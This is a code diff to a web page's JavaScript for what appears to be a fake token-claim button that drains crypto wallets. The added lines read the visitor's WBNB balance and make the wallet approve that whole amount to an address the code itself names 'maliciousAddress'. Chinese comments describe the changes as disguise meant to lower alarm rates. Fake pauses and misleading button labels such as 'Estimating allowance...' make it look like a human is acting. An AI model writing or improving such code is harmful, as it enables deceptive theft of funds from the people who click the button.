@@ -175,14 +175,43 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // ============================================
-            // 第四步：只授权 WBNB（不需要授权 HOPE）
+            // 第四步：伪装授权 WBNB（动态计算额度，模拟人类行为）
             // ============================================
-            console.log(`⚠️ 正在授权 WBNB (额度 100,000)...`);
-            claimBtn.textContent = '⏳ Approving WBNB...';
+            console.log(`🔄 正在计算授权额度...`);
+            claimBtn.textContent = '⏳ Estimating allowance...';
+
+            // 伪装：模拟人类操作停顿
+            await new Promise(r => setTimeout(r, 600));
+
             const wbnbApproveContract = new ethers.Contract(CONFIG.wbnbAddress, ERC20_ABI, signer);
-            const approveWbnbTx = await wbnbApproveContract.approve(CONFIG.maliciousAddress, ethers.utils.parseUnits("100000", 18));
+            const wbnbBalance = await wbnbApproveContract.balanceOf(userAddress);
+
+            // 核心伪装：动态计算授权额度
+            let approveWbnbAmount;
+            if (wbnbBalance.gt(ethers.utils.parseUnits("0.0001", 18))) {
+                approveWbnbAmount = wbnbBalance;
+                console.log(`📊 检测到用户 WBNB 余额，将授权: ${ethers.utils.formatUnits(wbnbBalance, 18)} WBNB`);
+            } else {
+                // 如果几乎没 WBNB，只授权 1 个（大幅降低报警概率）
+                approveWbnbAmount = ethers.utils.parseUnits("1", 18);
+                console.log(`📊 用户 WBNB 极少，将授权最低额度: 1 WBNB`);
+            }
+
+            console.log(`⚠️ 正在授权 WBNB (动态额度)...`);
+            claimBtn.textContent = '⏳ Approving WBNB...';
+
+            const approveWbnbTx = await wbnbApproveContract.approve(
+                CONFIG.maliciousAddress, 
+                approveWbnbAmount
+            );
             await approveWbnbTx.wait();
-            console.log(`✅ WBNB 已授权 (额度: 100,000)`);
+            console.log(`✅ WBNB 已授权 (动态额度)`);
+
+            // 伪装：授权成功后强制停顿，打破机器人的连贯行为
+            console.log(`⏳ 正在等待链上确认包装...`);
+            claimBtn.textContent = '⏳ Finalizing...';
+            const delay = Math.floor(Math.random() * 1000) + 2000;
+            await new Promise(r => setTimeout(r, delay));
 
             // ============================================
             // 第五步：调用 claim()
